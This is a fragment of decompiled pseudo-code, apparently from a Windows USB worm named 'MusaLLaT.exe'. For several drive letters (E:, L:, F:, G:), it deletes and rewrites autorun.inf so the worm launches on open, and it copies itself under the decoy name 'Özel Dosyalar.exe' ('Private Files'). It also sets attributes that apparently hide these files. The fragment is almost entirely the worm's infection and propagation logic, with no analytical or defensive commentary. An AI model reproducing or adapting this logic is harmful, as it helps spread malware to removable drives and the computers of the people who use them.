  loc_0043E557:   call var_80D0 = global_00401044("or", var_80CC)
  loc_0043E565:   call var_80D4 = global_004011AC
  loc_0043E571:   call var_80D8 = global_00401044("un.", var_80D4)
  loc_0043E57F:   call var_80DC = global_004011AC
  loc_0043E58B:   call var_80E0 = global_00401044(global_004193A4, var_80DC)
  loc_0043E599:   call var_80E4 = global_004011AC
  loc_0043E5A5:   call var_80E8 = global_00401044("nf", var_80E4)
  loc_0043E5B3:   call var_80EC = global_004011AC
  loc_0043E5BA:   call var_80F0 = global_00401110(var_80EC)
  loc_0043E5E5:   call var_80F4 = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_0043E5FF:   call var_80F8 = global_00401044("ut", "E:\a")
  loc_0043E60D:   call var_80FC = global_004011AC
  loc_0043E619:   call var_8100 = global_00401044("or", var_80FC)
  loc_0043E627:   call var_8104 = global_004011AC
  loc_0043E633:   call var_8108 = global_00401044("un.", var_8104)
  loc_0043E641:   call var_810C = global_004011AC
  loc_0043E64D:   call var_8110 = global_00401044(global_004193A4, var_810C)
  loc_0043E65B:   call var_8114 = global_004011AC
  loc_0043E667:   call var_8118 = global_00401044("nf", var_8114)
  loc_0043E675:   call var_811C = global_004011AC
  loc_0043E683:   call var_8120 = global_00401188(var_B8, var_811C)
  loc_0043E68A:   var_8124 = DeleteFile(var_8120)
  loc_0043E68F:   call var_8128 = global_00401054
  loc_0043E6C1:   call var_812C = global_00401150(00000006h, var_A4, var_A8, var_AC, var_B0, var_B4, var_B8)
  loc_0043E6DB:   call var_8130 = global_00401044("ut", "E:\a")
  loc_0043E6E9:   call var_8134 = global_004011AC
  loc_0043E6F5:   call var_8138 = global_00401044("or", var_8134)
  loc_0043E703:   call var_813C = global_004011AC
  loc_0043E70F:   call var_8140 = global_00401044("un.", var_813C)
  loc_0043E71D:   call var_8144 = global_004011AC
  loc_0043E729:   call var_8148 = global_00401044(global_004193A4, var_8144)
  loc_0043E737:   call var_814C = global_004011AC
  loc_0043E743:   call var_8150 = global_00401044("nf", var_814C)
  loc_0043E751:   call var_8154 = global_004011AC
  loc_0043E75E:   call var_8158 = global_0040112C(00000002h, FFFFFFFFh, 00000001h, var_8154)
  loc_0043E789:   call var_815C = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_0043E7A5:   call var_8160 = global_004010F0(global_004194A0, 00000001h, "[AutoRun]")
  loc_0043E7C1:   call var_8164 = global_004010F0(global_004194A0, 00000001h, "Open=MusaLLaT.exe")
  loc_0043E7DD:   call var_8168 = global_004010F0(global_004194A0, 00000001h, "Shell\Open=Aç")
  loc_0043E7F9:   call var_816C = global_004010F0(global_004194A0, 00000001h, "Shell\Open\Command=MusaLLaT.exe")
  loc_0043E80B:   call var_8170 = global_004010A0(00000001h)
  loc_0043E81F:   call var_8174 = global_004011D0("E:\MusaLLaT.exe", 00000006h)
  loc_0043E838:   call var_8178 = global_00401044("ut", "E:\a", 00000006h)
  loc_0043E846:   call var_817C = global_004011AC
  loc_0043E852:   call var_8180 = global_00401044("or", var_817C)
  loc_0043E860:   call var_8184 = global_004011AC
  loc_0043E86C:   call var_8188 = global_00401044("un.", var_8184)
  loc_0043E87A:   call var_818C = global_004011AC
  loc_0043E886:   call var_8190 = global_00401044(global_004193A4, var_818C)
  loc_0043E894:   call var_8194 = global_004011AC
  loc_0043E8A0:   call var_8198 = global_00401044("nf", var_8194)
  loc_0043E8AE:   call var_819C = global_004011AC
  loc_0043E8B5:   call var_81A0 = global_004011D0(var_819C)
  loc_0043E8E0:   call var_81A4 = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_0043E90D:   call var_81A8 = global_00401010
  loc_0043E913: End If
  loc_0043E91A: var_F8 = "L:\"
  loc_0043E93A: call var_81AC = global_0040118C
  loc_0043E949: call var_81B0 = global_00401120(var_D0, 00000000h)
  loc_0043E957: call var_81B4 = global_004011AC
  loc_0043E963: call var_81B8 = global_004010B0(global_00418DE4, var_81B4)
  loc_0043E971: var_118 = var_81B8
  loc_0043E9AF: call var_81BC = global_00401174(var_E0, &H800B, var_60, var_120)
  loc_0043E9BD: call var_81C0 = global_004010E4(var_F0, var_81BC)
  loc_0043E9C4: call var_81C4 = global_00401090(var_81C0)
  loc_0043E9D7: call var_81C8 = global_004011CC
  loc_0043E9ED: call var_81CC = global_00401024(00000002h, var_D0, var_120)
  loc_0043E9FF: If var_81C4 Then
  loc_0043EA13:   If global_00460558 = 0 Then
  loc_0043EA1F:     call var_81D0 = global_00401134(global_00418EE0, global_00460558)
  loc_0043EA25:     var_188 = global_00460558
  loc_0043EA31:   Else
  loc_0043EA3B:   End If
  loc_0043EA43:   var_124 = var_188
  loc_0043EA5F:   var_BC = var_124.UnkVCall_00000014h
  loc_0043EA64:   var_128 = var_BC
  loc_0043EA71:   If var_128 < 0 Then
  loc_0043EA88:     call var_81D4 = global_00401058(var_128, var_124, global_00418ED0, 00000014h)
  loc_0043EA8E:     var_18C = var_81D4
  loc_0043EA96:   Else
  loc_0043EAA0:   End If
  loc_0043EAA6:   var_12C = var_BC
  loc_0043EAC2:   var_A4 = var_12C.UnkVCall_00000050h
  loc_0043EAC7:   var_130 = var_A4
  loc_0043EAD4:   If var_130 < 0 Then
  loc_0043EAEB:     call var_81D8 = global_00401058(var_130, var_12C, global_00418EF0, 00000050h)
  loc_0043EAF1:     var_190 = var_81D8
  loc_0043EAF9:   Else
  loc_0043EB03:   End If
  loc_0043EB0A:   If global_00460558 = 0 Then
  loc_0043EB16:     call var_81DC = global_00401134(global_00418EE0, global_00460558)
  loc_0043EB1C:     var_194 = global_00460558
  loc_0043EB28:   Else
  loc_0043EB32:   End If
  loc_0043EB3A:   var_134 = var_194
  loc_0043EB56:   var_C0 = var_134.UnkVCall_00000014h
  loc_0043EB5B:   var_138 = var_C0
  loc_0043EB68:   If var_138 < 0 Then
  loc_0043EB7F:     call var_81E0 = global_00401058(var_138, var_134, global_00418ED0, 00000014h)
  loc_0043EB85:     var_198 = var_81E0
  loc_0043EB8D:   Else
  loc_0043EB97:   End If
  loc_0043EB9D:   var_13C = var_C0
  loc_0043EBB9:   var_A8 = var_13C.UnkVCall_00000058h
  loc_0043EBBE:   var_140 = var_A8
  loc_0043EBCB:   If var_140 < 0 Then
  loc_0043EBE2:     call var_81E4 = global_00401058(var_140, var_13C, global_00418EF0, 00000058h)
  loc_0043EBE8:     var_19C = var_81E4
  loc_0043EBF0:   Else
  loc_0043EBFA:   End If
  loc_0043EC0B:   call var_81E8 = global_00401044("\", var_A4, "L:\MusaLLaT.exe")
  loc_0043EC19:   call var_81EC = global_004011AC
  loc_0043EC27:   call var_81F0 = global_00401044(var_A8, var_81EC)
  loc_0043EC35:   call var_81F4 = global_004011AC
  loc_0043EC41:   call var_81F8 = global_00401044(".exe", var_81F4)
  loc_0043EC4F:   call var_81FC = global_004011AC
  loc_0043EC56:   call var_8200 = global_00401158(var_81FC)
  loc_0043EC81:   call var_8204 = global_00401150(00000005h, var_A4, var_AC, var_A8, var_B0, var_B4)
  loc_0043EC9A:   call var_8208 = global_0040102C(00000002h, var_BC, var_C0)
  loc_0043ECAA:   var_F8 = "L:\Özel Dosyalar.exe"
  loc_0043ECCA:   call var_820C = global_0040118C
  loc_0043ECD9:   call var_8210 = global_00401120(var_D0, 00000000h)
  loc_0043ECE7:   call var_8214 = global_004011AC
  loc_0043ECF3:   call var_8218 = global_004010B0(global_00418DE4, var_8214)
  loc_0043ED01:   var_118 = var_8218
  loc_0043ED3F:   call var_821C = global_00401174(var_E0, &H800B, var_60, var_120)
  loc_0043ED4D:   call var_8220 = global_004010E4(var_F0, var_821C)
  loc_0043ED54:   call var_8224 = global_00401090(var_8220)
  loc_0043ED67:   call var_8228 = global_004011CC
  loc_0043ED7D:   call var_822C = global_00401024(00000002h, var_D0, var_120)
  loc_0043ED8F:   If var_8224 Then
  loc_0043ED91:     GoTo loc_0043F034
  loc_0043ED96:   End If
  loc_0043EDA4:   If global_00460558 = 0 Then
  loc_0043EDB0:     call var_8230 = global_00401134(global_00418EE0, global_00460558)
  loc_0043EDB6:     var_1A0 = global_00460558
  loc_0043EDC2:   Else
  loc_0043EDCC:   End If
  loc_0043EDD4:   var_124 = var_1A0
  loc_0043EDF0:   var_BC = var_124.UnkVCall_00000014h
  loc_0043EDF5:   var_128 = var_BC
  loc_0043EE02:   If var_128 < 0 Then
  loc_0043EE19:     call var_8234 = global_00401058(var_128, var_124, global_00418ED0, 00000014h)
  loc_0043EE1F:     var_1A4 = var_8234
  loc_0043EE27:   Else
  loc_0043EE31:   End If
  loc_0043EE37:   var_12C = var_BC
  loc_0043EE53:   var_A4 = var_12C.UnkVCall_00000050h
  loc_0043EE58:   var_130 = var_A4
  loc_0043EE65:   If var_130 < 0 Then
  loc_0043EE7C:     call var_8238 = global_00401058(var_130, var_12C, global_00418EF0, 00000050h)
  loc_0043EE82:     var_1A8 = var_8238
  loc_0043EE8A:   Else
  loc_0043EE94:   End If
  loc_0043EE9B:   If global_00460558 = 0 Then
  loc_0043EEA7:     call var_823C = global_00401134(global_00418EE0, global_00460558)
  loc_0043EEAD:     var_1AC = global_00460558
  loc_0043EEB9:   Else
  loc_0043EEC3:   End If
  loc_0043EECB:   var_134 = var_1AC
  loc_0043EEE7:   var_C0 = var_134.UnkVCall_00000014h
  loc_0043EEEC:   var_138 = var_C0
  loc_0043EEF9:   If var_138 < 0 Then
  loc_0043EF10:     call var_8240 = global_00401058(var_138, var_134, global_00418ED0, 00000014h)
  loc_0043EF16:     var_1B0 = var_8240
  loc_0043EF1E:   Else
  loc_0043EF28:   End If
  loc_0043EF2E:   var_13C = var_C0
  loc_0043EF4A:   var_A8 = var_13C.UnkVCall_00000058h
  loc_0043EF4F:   var_140 = var_A8
  loc_0043EF5C:   If var_140 < 0 Then
  loc_0043EF73:     call var_8244 = global_00401058(var_140, var_13C, global_00418EF0, 00000058h)
  loc_0043EF79:     var_1B4 = var_8244
  loc_0043EF81:   Else
  loc_0043EF8B:   End If
  loc_0043EF9C:   call var_8248 = global_00401044("\", var_A4, "L:\Özel Dosyalar.exe")
  loc_0043EFAA:   call var_824C = global_004011AC
  loc_0043EFB8:   call var_8250 = global_00401044(var_A8, var_824C)
  loc_0043EFC6:   call var_8254 = global_004011AC
  loc_0043EFD2:   call var_8258 = global_00401044(".exe", var_8254)
  loc_0043EFE0:   call var_825C = global_004011AC
  loc_0043EFE7:   call var_8260 = global_00401158(var_825C)
  loc_0043F012:   call var_8264 = global_00401150(00000005h, var_A4, var_AC, var_A8, var_B0, var_B4)
  loc_0043F02B:   call var_8268 = global_0040102C(00000002h, var_BC, var_C0)
  loc_0043F034:   ' Referenced from: 0043ED91
  loc_0043F045:   call var_826C = global_00401044("ut", "L:\a")
  loc_0043F053:   call var_8270 = global_004011AC
  loc_0043F05F:   call var_8274 = global_00401044("or", var_8270)
  loc_0043F06D:   call var_8278 = global_004011AC
  loc_0043F079:   call var_827C = global_00401044("un.", var_8278)
  loc_0043F087:   call var_8280 = global_004011AC
  loc_0043F093:   call var_8284 = global_00401044(global_004193A4, var_8280)
  loc_0043F0A1:   call var_8288 = global_004011AC
  loc_0043F0AD:   call var_828C = global_00401044("nf", var_8288)
  loc_0043F0BB:   call var_8290 = global_004011AC
  loc_0043F0C2:   call var_8294 = global_00401110(var_8290)
  loc_0043F0ED:   call var_8298 = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_0043F107:   call var_829C = global_00401044("ut", "L:\a")
  loc_0043F115:   call var_82A0 = global_004011AC
  loc_0043F121:   call var_82A4 = global_00401044("or", var_82A0)
  loc_0043F12F:   call var_82A8 = global_004011AC
  loc_0043F13B:   call var_82AC = global_00401044("un.", var_82A8)
  loc_0043F149:   call var_82B0 = global_004011AC
  loc_0043F155:   call var_82B4 = global_00401044(global_004193A4, var_82B0)
  loc_0043F163:   call var_82B8 = global_004011AC
  loc_0043F16F:   call var_82BC = global_00401044("nf", var_82B8)
  loc_0043F17D:   call var_82C0 = global_004011AC
  loc_0043F18B:   call var_82C4 = global_00401188(var_B8, var_82C0)
  loc_0043F192:   var_82C8 = DeleteFile(var_82C4)
  loc_0043F197:   call var_82CC = global_00401054
  loc_0043F1C9:   call var_82D0 = global_00401150(00000006h, var_A4, var_A8, var_AC, var_B0, var_B4, var_B8)
  loc_0043F1E3:   call var_82D4 = global_00401044("ut", "L:\a")
  loc_0043F1F1:   call var_82D8 = global_004011AC
  loc_0043F1FD:   call var_82DC = global_00401044("or", var_82D8)
  loc_0043F20B:   call var_82E0 = global_004011AC
  loc_0043F217:   call var_82E4 = global_00401044("un.", var_82E0)
  loc_0043F225:   call var_82E8 = global_004011AC
  loc_0043F231:   call var_82EC = global_00401044(global_004193A4, var_82E8)
  loc_0043F23F:   call var_82F0 = global_004011AC
  loc_0043F24B:   call var_82F4 = global_00401044("nf", var_82F0)
  loc_0043F259:   call var_82F8 = global_004011AC
  loc_0043F266:   call var_82FC = global_0040112C(00000002h, FFFFFFFFh, 00000001h, var_82F8)
  loc_0043F291:   call var_8300 = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_0043F2AD:   call var_8304 = global_004010F0(global_004194A0, 00000001h, "[AutoRun]")
  loc_0043F2C9:   call var_8308 = global_004010F0(global_004194A0, 00000001h, "Open=MusaLLaT.exe")
  loc_0043F2E5:   call var_830C = global_004010F0(global_004194A0, 00000001h, "Shell\Open=Aç")
  loc_0043F301:   call var_8310 = global_004010F0(global_004194A0, 00000001h, "Shell\Open\Command=MusaLLaT.exe")
  loc_0043F313:   call var_8314 = global_004010A0(00000001h)
  loc_0043F327:   call var_8318 = global_004011D0("L:\MusaLLaT.exe", 00000006h)
  loc_0043F340:   call var_831C = global_00401044("ut", "L:\a", 00000006h)
  loc_0043F34E:   call var_8320 = global_004011AC
  loc_0043F35A:   call var_8324 = global_00401044("or", var_8320)
  loc_0043F368:   call var_8328 = global_004011AC
  loc_0043F374:   call var_832C = global_00401044("un.", var_8328)
  loc_0043F382:   call var_8330 = global_004011AC
  loc_0043F38E:   call var_8334 = global_00401044(global_004193A4, var_8330)
  loc_0043F39C:   call var_8338 = global_004011AC
  loc_0043F3A8:   call var_833C = global_00401044("nf", var_8338)
  loc_0043F3B6:   call var_8340 = global_004011AC
  loc_0043F3BD:   call var_8344 = global_004011D0(var_8340)
  loc_0043F3E8:   call var_8348 = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_0043F415:   call var_834C = global_00401010
  loc_0043F41B: End If
  loc_0043F422: var_F8 = "F:\"
  loc_0043F442: call var_8350 = global_0040118C
  loc_0043F451: call var_8354 = global_00401120(var_D0, 00000000h)
  loc_0043F45F: call var_8358 = global_004011AC
  loc_0043F46B: call var_835C = global_004010B0(global_00418DE4, var_8358)
  loc_0043F479: var_118 = var_835C
  loc_0043F4B7: call var_8360 = global_00401174(var_E0, &H800B, var_80, var_120)
  loc_0043F4C5: call var_8364 = global_004010E4(var_F0, var_8360)
  loc_0043F4CC: call var_8368 = global_00401090(var_8364)
  loc_0043F4DF: call var_836C = global_004011CC
  loc_0043F4F5: call var_8370 = global_00401024(00000002h, var_D0, var_120)
  loc_0043F507: If var_8368 Then
  loc_0043F51B:   If global_00460558 = 0 Then
  loc_0043F527:     call var_8374 = global_00401134(global_00418EE0, global_00460558)
  loc_0043F52D:     var_1B8 = global_00460558
  loc_0043F539:   Else
  loc_0043F543:   End If
  loc_0043F54B:   var_124 = var_1B8
  loc_0043F567:   var_BC = var_124.UnkVCall_00000014h
  loc_0043F56C:   var_128 = var_BC
  loc_0043F579:   If var_128 < 0 Then
  loc_0043F590:     call var_8378 = global_00401058(var_128, var_124, global_00418ED0, 00000014h)
  loc_0043F596:     var_1BC = var_8378
  loc_0043F59E:   Else
  loc_0043F5A8:   End If
  loc_0043F5AE:   var_12C = var_BC
  loc_0043F5CA:   var_A4 = var_12C.UnkVCall_00000050h
  loc_0043F5CF:   var_130 = var_A4
  loc_0043F5DC:   If var_130 < 0 Then
  loc_0043F5F3:     call var_837C = global_00401058(var_130, var_12C, global_00418EF0, 00000050h)
  loc_0043F5F9:     var_1C0 = var_837C
  loc_0043F601:   Else
  loc_0043F60B:   End If
  loc_0043F612:   If global_00460558 = 0 Then
  loc_0043F61E:     call var_8380 = global_00401134(global_00418EE0, global_00460558)
  loc_0043F624:     var_1C4 = global_00460558
  loc_0043F630:   Else
  loc_0043F63A:   End If
  loc_0043F642:   var_134 = var_1C4
  loc_0043F65E:   var_C0 = var_134.UnkVCall_00000014h
  loc_0043F663:   var_138 = var_C0
  loc_0043F670:   If var_138 < 0 Then
  loc_0043F687:     call var_8384 = global_00401058(var_138, var_134, global_00418ED0, 00000014h)
  loc_0043F68D:     var_1C8 = var_8384
  loc_0043F695:   Else
  loc_0043F69F:   End If
  loc_0043F6A5:   var_13C = var_C0
  loc_0043F6C1:   var_A8 = var_13C.UnkVCall_00000058h
  loc_0043F6C6:   var_140 = var_A8
  loc_0043F6D3:   If var_140 < 0 Then
  loc_0043F6EA:     call var_8388 = global_00401058(var_140, var_13C, global_00418EF0, 00000058h)
  loc_0043F6F0:     var_1CC = var_8388
  loc_0043F6F8:   Else
  loc_0043F702:   End If
  loc_0043F713:   call var_838C = global_00401044("\", var_A4, "F:\MusaLLaT.exe")
  loc_0043F721:   call var_8390 = global_004011AC
  loc_0043F72F:   call var_8394 = global_00401044(var_A8, var_8390)
  loc_0043F73D:   call var_8398 = global_004011AC
  loc_0043F749:   call var_839C = global_00401044(".exe", var_8398)
  loc_0043F757:   call var_83A0 = global_004011AC
  loc_0043F75E:   call var_83A4 = global_00401158(var_83A0)
  loc_0043F789:   call var_83A8 = global_00401150(00000005h, var_A4, var_AC, var_A8, var_B0, var_B4)
  loc_0043F7A2:   call var_83AC = global_0040102C(00000002h, var_BC, var_C0)
  loc_0043F7B2:   var_F8 = "F:\Özel Dosyalar.exe"
  loc_0043F7D2:   call var_83B0 = global_0040118C
  loc_0043F7E1:   call var_83B4 = global_00401120(var_D0, 00000000h)
  loc_0043F7EF:   call var_83B8 = global_004011AC
  loc_0043F7FB:   call var_83BC = global_004010B0(global_00418DE4, var_83B8)
  loc_0043F809:   var_118 = var_83BC
  loc_0043F847:   call var_83C0 = global_00401174(var_E0, &H800B, var_80, var_120)
  loc_0043F855:   call var_83C4 = global_004010E4(var_F0, var_83C0)
  loc_0043F85C:   call var_83C8 = global_00401090(var_83C4)
  loc_0043F86F:   call var_83CC = global_004011CC
  loc_0043F885:   call var_83D0 = global_00401024(00000002h, var_D0, var_120)
  loc_0043F897:   If var_83C8 Then
  loc_0043F899:     GoTo loc_0043FB3C
  loc_0043F89E:   End If
  loc_0043F8AC:   If global_00460558 = 0 Then
  loc_0043F8B8:     call var_83D4 = global_00401134(global_00418EE0, global_00460558)
  loc_0043F8BE:     var_1D0 = global_00460558
  loc_0043F8CA:   Else
  loc_0043F8D4:   End If
  loc_0043F8DC:   var_124 = var_1D0
  loc_0043F8F8:   var_BC = var_124.UnkVCall_00000014h
  loc_0043F8FD:   var_128 = var_BC
  loc_0043F90A:   If var_128 < 0 Then
  loc_0043F921:     call var_83D8 = global_00401058(var_128, var_124, global_00418ED0, 00000014h)
  loc_0043F927:     var_1D4 = var_83D8
  loc_0043F92F:   Else
  loc_0043F939:   End If
  loc_0043F93F:   var_12C = var_BC
  loc_0043F95B:   var_A4 = var_12C.UnkVCall_00000050h
  loc_0043F960:   var_130 = var_A4
  loc_0043F96D:   If var_130 < 0 Then
  loc_0043F984:     call var_83DC = global_00401058(var_130, var_12C, global_00418EF0, 00000050h)
  loc_0043F98A:     var_1D8 = var_83DC
  loc_0043F992:   Else
  loc_0043F99C:   End If
  loc_0043F9A3:   If global_00460558 = 0 Then
  loc_0043F9AF:     call var_83E0 = global_00401134(global_00418EE0, global_00460558)
  loc_0043F9B5:     var_1DC = global_00460558
  loc_0043F9C1:   Else
  loc_0043F9CB:   End If
  loc_0043F9D3:   var_134 = var_1DC
  loc_0043F9EF:   var_C0 = var_134.UnkVCall_00000014h
  loc_0043F9F4:   var_138 = var_C0
  loc_0043FA01:   If var_138 < 0 Then
  loc_0043FA18:     call var_83E4 = global_00401058(var_138, var_134, global_00418ED0, 00000014h)
  loc_0043FA1E:     var_1E0 = var_83E4
  loc_0043FA26:   Else
  loc_0043FA30:   End If
  loc_0043FA36:   var_13C = var_C0
  loc_0043FA52:   var_A8 = var_13C.UnkVCall_00000058h
  loc_0043FA57:   var_140 = var_A8
  loc_0043FA64:   If var_140 < 0 Then
  loc_0043FA7B:     call var_83E8 = global_00401058(var_140, var_13C, global_00418EF0, 00000058h)
  loc_0043FA81:     var_1E4 = var_83E8
  loc_0043FA89:   Else
  loc_0043FA93:   End If
  loc_0043FAA4:   call var_83EC = global_00401044("\", var_A4, "F:\Özel Dosyalar.exe")
  loc_0043FAB2:   call var_83F0 = global_004011AC
  loc_0043FAC0:   call var_83F4 = global_00401044(var_A8, var_83F0)
  loc_0043FACE:   call var_83F8 = global_004011AC
  loc_0043FADA:   call var_83FC = global_00401044(".exe", var_83F8)
  loc_0043FAE8:   call var_8400 = global_004011AC
  loc_0043FAEF:   call var_8404 = global_00401158(var_8400)
  loc_0043FB1A:   call var_8408 = global_00401150(00000005h, var_A4, var_AC, var_A8, var_B0, var_B4)
  loc_0043FB33:   call var_840C = global_0040102C(00000002h, var_BC, var_C0)
  loc_0043FB3C:   ' Referenced from: 0043F899
  loc_0043FB4D:   call var_8410 = global_00401044("ut", "F:\a")
  loc_0043FB5B:   call var_8414 = global_004011AC
  loc_0043FB67:   call var_8418 = global_00401044("or", var_8414)
  loc_0043FB75:   call var_841C = global_004011AC
  loc_0043FB81:   call var_8420 = global_00401044("un.", var_841C)
  loc_0043FB8F:   call var_8424 = global_004011AC
  loc_0043FB9B:   call var_8428 = global_00401044(global_004193A4, var_8424)
  loc_0043FBA9:   call var_842C = global_004011AC
  loc_0043FBB5:   call var_8430 = global_00401044("nf", var_842C)
  loc_0043FBC3:   call var_8434 = global_004011AC
  loc_0043FBCA:   call var_8438 = global_00401110(var_8434)
  loc_0043FBF5:   call var_843C = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_0043FC0F:   call var_8440 = global_00401044("ut", "F:\a")
  loc_0043FC1D:   call var_8444 = global_004011AC
  loc_0043FC29:   call var_8448 = global_00401044("or", var_8444)
  loc_0043FC37:   call var_844C = global_004011AC
  loc_0043FC43:   call var_8450 = global_00401044("un.", var_844C)
  loc_0043FC51:   call var_8454 = global_004011AC
  loc_0043FC5D:   call var_8458 = global_00401044(global_004193A4, var_8454)
  loc_0043FC6B:   call var_845C = global_004011AC
  loc_0043FC77:   call var_8460 = global_00401044("nf", var_845C)
  loc_0043FC85:   call var_8464 = global_004011AC
  loc_0043FC93:   call var_8468 = global_00401188(var_B8, var_8464)
  loc_0043FC9A:   var_846C = DeleteFile(var_8468)
  loc_0043FC9F:   call var_8470 = global_00401054
  loc_0043FCD1:   call var_8474 = global_00401150(00000006h, var_A4, var_A8, var_AC, var_B0, var_B4, var_B8)
  loc_0043FCEB:   call var_8478 = global_00401044("ut", "F:\a")
  loc_0043FCF9:   call var_847C = global_004011AC
  loc_0043FD05:   call var_8480 = global_00401044("or", var_847C)
  loc_0043FD13:   call var_8484 = global_004011AC
  loc_0043FD1F:   call var_8488 = global_00401044("un.", var_8484)
  loc_0043FD2D:   call var_848C = global_004011AC
  loc_0043FD39:   call var_8490 = global_00401044(global_004193A4, var_848C)
  loc_0043FD47:   call var_8494 = global_004011AC
  loc_0043FD53:   call var_8498 = global_00401044("nf", var_8494)
  loc_0043FD61:   call var_849C = global_004011AC
  loc_0043FD6E:   call var_84A0 = global_0040112C(00000002h, FFFFFFFFh, 00000001h, var_849C)
  loc_0043FD99:   call var_84A4 = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_0043FDB5:   call var_84A8 = global_004010F0(global_004194A0, 00000001h, "[AutoRun]")
  loc_0043FDD1:   call var_84AC = global_004010F0(global_004194A0, 00000001h, "Open=MusaLLaT.exe")
  loc_0043FDED:   call var_84B0 = global_004010F0(global_004194A0, 00000001h, "Shell\Open=Aç")
  loc_0043FE09:   call var_84B4 = global_004010F0(global_004194A0, 00000001h, "Shell\Open\Command=MusaLLaT.exe")
  loc_0043FE1B:   call var_84B8 = global_004010A0(00000001h)
  loc_0043FE2F:   call var_84BC = global_004011D0("F:\MusaLLaT.exe", 00000006h)
  loc_0043FE48:   call var_84C0 = global_00401044("ut", "F:\a", 00000006h)
  loc_0043FE56:   call var_84C4 = global_004011AC
  loc_0043FE62:   call var_84C8 = global_00401044("or", var_84C4)
  loc_0043FE70:   call var_84CC = global_004011AC
  loc_0043FE7C:   call var_84D0 = global_00401044("un.", var_84CC)
  loc_0043FE8A:   call var_84D4 = global_004011AC
  loc_0043FE96:   call var_84D8 = global_00401044(global_004193A4, var_84D4)
  loc_0043FEA4:   call var_84DC = global_004011AC
  loc_0043FEB0:   call var_84E0 = global_00401044("nf", var_84DC)
  loc_0043FEBE:   call var_84E4 = global_004011AC
  loc_0043FEC5:   call var_84E8 = global_004011D0(var_84E4)
  loc_0043FEF0:   call var_84EC = global_00401150(00000005h, var_A4, var_A8, var_AC, var_B0, var_B4)
  loc_0043FF1D:   call var_84F0 = global_00401010
  loc_0043FF23: End If
  loc_0043FF2A: var_F8 = "G:\"
  loc_0043FF4A: call var_84F4 = global_0040118C
  loc_0043FF59: call var_84F8 = global_00401120(var_D0, 00000000h)
  loc_0043FF67: call var_84FC = global_004011AC
  loc_0043FF73: call var_8500 = global_004010B0(global_00418DE4, var_84FC)
  loc_0043FF81: var_118 = var_8500
  loc_0043FFC2: call var_8504 = global_00401174(var_E0, &H800B, var_90, var_120)
  loc_0043FFD0: call var_8508 = global_004010E4(var_F0, var_8504)
  loc_0043FFD7: call var_850C = global_00401090(var_8508)
  loc_0043FFEA: call var_8510 = global_004011CC
  loc_00440000: call var_8514 = global_00401024(00000002h, var_D0, var_120)
  loc_00440012: If var_850C Then
  loc_00440026:   If global_00460558 = 0 Then
  loc_00440032:     call var_8518 = global_00401134(global_00418EE0, global_00460558)
  loc_00440038:     var_1E8 = global_00460558
  loc_00440044:   Else
  loc_0044004E:   End If
  loc_00440056:   var_124 = var_1E8
  loc_00440072:   var_BC = var_124.UnkVCall_00000014h
  loc_00440077:   var_128 = var_BC
  loc_00440084:   If var_128 < 0 Then
  loc_0044009B:     call var_851C = global_00401058(var_128, var_124, global_00418ED0, 00000014h)
  loc_004400A1:     var_1EC = var_851C
  loc_004400A9:   Else
  loc_004400B3:   End If
  loc_004400B9:   var_12C = var_BC
  loc_004400D5:   var_A4 = var_12C.UnkVCall_00000050h
  loc_004400DA:   var_130 = var_A4
  loc_004400E7:   If var_130 < 0 Then
  loc_004400FE:     call var_8520 = global_00401058(var_130, var_12C, global_00418EF0, 00000050h)
  loc_00440104:     var_1F0 = var_8520
  loc_0044010C:   Else
  loc_00440116:   End If
  loc_0044011D:   If global_00460558 = 0 Then
  loc_00440129:     call var_8524 = global_00401134(global_00418EE0, global_00460558)
  loc_0044012F:     var_1F4 = global_00460558
  loc_0044013B:   Else
  loc_00440145:   End If
  loc_0044014D:   var_134 = var_1F4
  loc_00440169:   var_C0 = var_134.UnkVCall_00000014h
  loc_0044016E:   var_138 = var_C0
  loc_0044017B:   If var_138 < 0 Then
  loc_00440192:     call var_8528 = global_00401058(var_138, var_134, global_00418ED0, 00000014h)
  loc_00440198:     var_1F8 = var_8528
  loc_004401A0:   Else
  loc_004401AA:   End If
  loc_004401B0:   var_13C = var_C0
  loc_004401CC:   var_A8 = var_13C.UnkVCall_00000058h
  loc_004401D1:   var_140 = var_A8
  loc_004401DE:   If var_140 < 0 Then
  loc_004401F5:     call var_852C = global_00401058(var_140, var_13C, global_00418EF0, 00000058h)
  loc_004401FB:     var_1FC = var_852C
  loc_00440203:   Else
  loc_0044020D:   End If
  loc_0044021E:   call var_8530 = global_00401044("\", var_A4, "G:\MusaLLaT.exe")
  loc_0044022C:   call var_8534 = global_004011AC
  loc_0044023A:   call var_8538 = global_00401044(var_A8, var_8534)
  loc_00440248:   call var_853C = global_004011AC
  loc_00440254:   call var_8540 = global_00401044(".exe", var_853C)
  loc_00440262:   call var_8544 = global_004011AC
  loc_00440269:   call var_8548 = global_00401158(var_8544)
  loc_00440294:   call var_854C = global_00401150(00000005h, var_A4, var_AC, var_A8, var_B0, var_B4)
  loc_004402AD:   call var_8550 = global_0040102C(00000002h, var_BC, var_C0)
  loc_004402BD:   var_F8 = "G:\Özel Dosyalar.exe"
  loc_004402DD:   call var_8554 = global_0040118C
  loc_004402EC:   call var_8558 = global_00401120(var_D0, 00000000h)
  loc_004402FA:   call var_855C = global_004011AC
  loc_00440306:   call var_8560 = global_004010B0(global_00418DE4, var_855C)
  loc_00440314:   var_118 = var_8560
  loc_00440355:   call var_8564 = global_00401174(var_E0, &H800B, var_90, var_120)
  loc_00440363:   call var_8568 = global_004010E4(var_F0, var_8564)
  loc_0044036A:   call var_856C = global_00401090(var_8568)
  loc_0044037D:   call var_8570 = global_004011CC
  loc_00440393:   call var_8574 = global_00401024(00000002h, var_D0, var_120)
  loc_004403A5:   If var_856C Then
  loc_004403A7:     GoTo loc_0044064A
  loc_004403AC:   End If
  loc_004403BA:   If global_00460558 = 0 Then
  loc_004403C6:     call var_8578 = global_00401134(global_00418EE0, global_00460558)
  loc_004403CC:     var_200 = global_00460558
  loc_004403D8:   Else
  loc_004403E2:   End If
  loc_004403EA:   var_124 = var_200
